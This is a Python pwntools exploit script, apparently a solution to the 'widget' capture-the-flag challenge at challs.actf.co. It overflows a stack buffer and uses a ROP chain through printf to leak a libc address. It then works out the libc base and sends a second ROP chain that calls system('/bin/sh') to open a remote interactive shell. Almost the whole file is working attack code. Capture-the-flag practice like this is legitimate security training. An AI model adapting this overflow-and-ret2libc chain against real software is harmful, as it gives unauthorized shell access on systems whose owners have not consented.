#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from subprocess import check_output

exe = context.binary = ELF('widget_patched')
libc = ELF('libc.so.6')

host = args.HOST or 'challs.actf.co'
port = int(args.PORT or 31320)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    
    data = io.recvline().decode()[15:]
    print(data)
    
    io.sendline(input('> '))

    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *main+341
b *0x004013d9
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

OFFSET = cyclic_find(0x6161616161616166,n=8)

p = b'A'*(OFFSET-8)
p += p64(exe.bss()+0x750) # keep stack usable

rop = ROP(exe)
rop.raw(rop.ret)
# rop.rdi = exe.got['printf'] # no need because already a libc pointer in rdi
rop.printf()
rop.raw(0x004013d9) # jump after check
p += rop.chain()

print(rop.dump())

io.sendlineafter(b'Amount: ',str(len(p)).encode())

io.sendlineafter(b'Contents: ',p)

leak = u64(io.recvuntil(b'Amo')[-9:-3].ljust(8,b'\0'))
libc.address = leak - libc.sym['funlockfile']
print(f"{leak = :x} {libc.address = :x}")


p = b'A'*(OFFSET)

rop = ROP([libc,exe])
rop.raw(rop.ret)
rop.rdi = next(libc.search(b'/bin/sh\0'))
rop.system()
p += rop.chain()
print(rop.dump())

io.sendlineafter(b'unt: ',str(len(p)).encode())
io.sendlineafter(b'Contents: ',p)

io.interactive()

